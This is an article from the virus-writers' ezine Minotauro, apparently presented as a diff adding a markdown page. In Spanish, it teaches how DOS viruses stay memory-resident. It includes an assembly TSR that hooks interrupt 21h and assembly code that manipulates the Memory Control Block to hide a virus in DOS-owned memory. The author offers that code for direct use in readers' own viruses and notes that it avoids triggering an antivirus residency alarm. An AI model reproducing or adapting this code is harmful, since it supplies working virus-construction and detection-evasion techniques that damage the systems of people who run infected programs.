@@ -1,0 +1,187 @@
+---
+title: "TEXT_002"
+ezine: "minotauro"
+---
+
+# TEXT_002
+
+**Ezine:** minotauro
+
+<div className="ascii-content">
+
+```
+Métodos de Residencia...
+-------------------------------------------------------------------------------
+
+	Este articulo intenta explicar los métodos mas usados de residencia, 
+con un enfoque mas práctico que teórico, dejando en claro lo fundamental para
+poder aprovecharlos, en especial el de MCB. Muestra ejemplos de los 2 tipos de 
+técnicas descritos, que pueden (en el caso del MCB) usarse directamente
+en sus propios virus.
+La teoría no esta muy detallada, pero se encontrará todo lo necesario para
+que el novato comprenda y pueda usar estos métodos. Y con la información
+del articulo, si desea profundizar la teoría, es solo cuestión de leer alguna
+guia o manual, que hable sobre la memoria, ya que aquí se explica lo básico
+necesario (espero...).
+
+Empezemos:
+	Los métodos mas usados para dejar a un virus residente son: 
+los que el DOS proporciona o el método de MCB (Memory Control Block).
+
+La primera forma es la mas simple, pero también la mas ineficaz,
+primero porque le informa al dos que se esta dejando algo residente... ademas 
+al ejecutarse esa función retorna el control al DOS. El programa que se 
+intente ejecutar termina!. El virus que use esta técnica para evitar salir 
+al DOS en su instalacion en memoria tiene que reejecutarse. Para quedar 
+residente, se ejecuta a si mismo otra vez (serv. 4bh), y en su segunda 
+ejecución ejecuta una int 27h o llama al servicio 31 de la int. 21h, esta a su 
+vez, le da en control al programa padre, al que se cargo primero, y este 
+puede entonces terminar, ejecutando al anfitrión.  Si esto no se hiciera, al
+ejecutar una int 21, por ejemplo, se le sedería el control al interprete de 
+comandos...
+
+Una de las característica de los virus que usan esta técnica es que
+suelen colocarse al principio de los archivos, estos servicios dejaran
+residente la cantidad de parraeo que se les indique desde el comienzo del
+programa en memoria... Si tenemos un COM de 50K y el virus al final, al
+usar la int 27h, y dejar residente, por ejemplo, 1k, lo que quedaria seria
+el primer K del COM, no el virus que esta al final....
+Es evidente que no pondemos dejar 50k  residentes... para que el virus quede
+en memoria se puede relocar(mover), a otro bloque, tranferirle el control, y
+luego este le sedera al control al programa padre...
+Para evitar esto, muchos se colocan al principio del programa que infectan.
+Claro que esto es lento, porque hay que leer todo el file, y luego escribirlo
+después del virus, lo que no pasa si va al final, en ese caso solo hay que
+escribir el virus, no el virus y el archivo!.
+Este método es poco elegante, ademas de lento si se infecta dejando el virus
+al comienzo, estro otras cosas...
+
+Abajo, sigue un fuente de un TSR, no de un virus!, solo un TSR normal
+para ilustrar su funcionamiento.
+Este ejemplo intercepta la int. 21 y luego le pasa el control sin
+hacer nada. Se le puede agregar el código para hacer lo que se quiera.
+
+===============================================================================
+===============================================================================
+code    segment 
+        assume cs:code,ds:code
+        org   100h             
+start:
+	jmp	instalar			;Salta a la rutina de
+						;instalacion.
+
+;En esta variable va la direccion original de la int 21h.
+old_21	dd	2
+
+new_21:
+
+;Aca va la rutina que se cuelga de la interrupcion 21h.
+
+	jmp	cs:[old_21]			;Salta a la int original.
+
+instalar:
+
+;Obtengo el vector original de la int 21
+	mov	ax, 3521h
+	int	21h
+	mov	word ptr old_21, bx	
+	mov	word ptr old_21+2, es	
+
+;Seteo el nuevo  vector de la int 21
+        mov     ax,2521h          
+   	push	cs
+	pop	ds
+        mov     dx, offset new_21
+        int     21h
+
+;Queda residente
+	mov	ah, 31h
+	mov	dx, 30d	 ;<--------- Cantidad de parrafeo(16 bytes) a dejar
+	int 	21h	 ;	     residentes.	
+
+code    ends
+end	start
+===============================================================================
+===============================================================================
+
+El segundo método es el de MCB, este es un poco mas complejo que simplemente
+llamar a al int 27h, pero es mucho mas eficaz.
+Para entender como funciona hay que saber que el dos crea un bloque de control
+por cada bloque de memoria que use, este bloque de control, mide 16 bytes, un
+parrafo y esta justo por escima  del bloque de memoria asignado.
+En un .COM, por ejemplo, en  cs - 1, esta la direccion de este bloque. 
+En el offset 3 del mismo esta la cantidad de memoria usada por ese 
+programa..., para poder dejar residente un prog. hay que restarle a ese valor
+la longitud del virus, luego liberar la memoria que ya no usa (servicio 4ah) y
+asignarla (servicio 48h) a nuesto prog.
+Para terminar, marcamos el MCB del segmento al que movimos nuestro virus con
+'8' en el offset 1, para que el dos piense que es parte suya y no use esa
+memoria. En ese offset se coloca una marca, para identificar al bloaque, para
+esta rutina usamos 8 poruque es el que usa el DOS.
+
+El código que sigue muestra como se hace...
+Este code sirve para dejar un virus residente desde un COM, si se carga desde
+un EXE hay que tener en cuanta que el segmento del MCB a modificar lo
+obtenemos de restarle 1 a DS y no a CS.
+
+===============================================================================
+===============================================================================
+;Paso a AX el Code Segment, lo decremento y paso a ES, para obtener
+;la memoria reservada por el programa anfitrión (ES:[3]), que queda en AX...
+	mov	ax, cs			;Con esto obtenemos el segmento
+	dec	ax			;del MCB.
+
+	mov	es, ax			;Aca estamos obteniendo del campo
+	mov	ax, es:[3]		;del MCB, la memoria utilizada.
+
+;Resto a la memoria  usada por el anfitrión la longitud del virus, el resultado
+;en AX.
+	sub	ax, bx			;En BX esta la longitud del virus,
+					;en parrafos.
+
+;Paso el resultado de la operacion anterior a BX,  para después llamar al
+;servicio de liberar memoria, que se llama com BX, con el nuevo tamaño y con
+;el asegmento en ES.
+	push	bx			;Salvo la cantidad de mem a reservar.
+	mov	bx, ax			;Le paso la nueva cantidad a BX.
+	push	cs 
+	pop	es
+	mov	ah, 4ah
+	int	21h
+
+;Asigno la memoria liberada a mi virus, el segmento de la memoria asignada 
+;queda en AX. Decremento BX porque un parrafo lo va a user el DOS....
+	pop	bx			;Popeo la  cantidad de mem a reservar.
+	dec	bx
+	mov	ah, 48h
+	int	21h
+
+;Decremento AX, y lo paso a ES, de esa forma apunto al parrafo que usa el DOS
+;como control, marco ese parrfo en el offset 1 con 8, para que el DOS lo 
+;considere como parte suya y no utilize esa zona de memoria.
+;Despues incremento AX otra vez y lo paso a ES, para que ES quede apuntando
+;a la memoria que el virus usara.
+	dec	ax
+	mov	es, ax
+	mov	word ptr es:[1], 8
+	mov	word ptr es:[8],'XX'           ;Opcional, un nombre al bloque.
+	inc	ax
+	mov	es, ax
+
+	push	es			       ;Salvo la dir del seg. del virus
+
+===============================================================================
+===============================================================================
+
+Ahora lo que queda es mover el  virus al segmento reservado, esto es cuestión
+de hacer un rep movsb al segmento al que apunta ES y listo, el virus esta
+residente.
+
+NOTA:
+La rutina en si no hace saltar ninguna alarma, la alarma de residencia del TB
+salta cuando detecta la actualizacion de la int 21h o 13h.
+
+				Text by Zarathustra for Minotauro Magazine
+```
+
+</div>
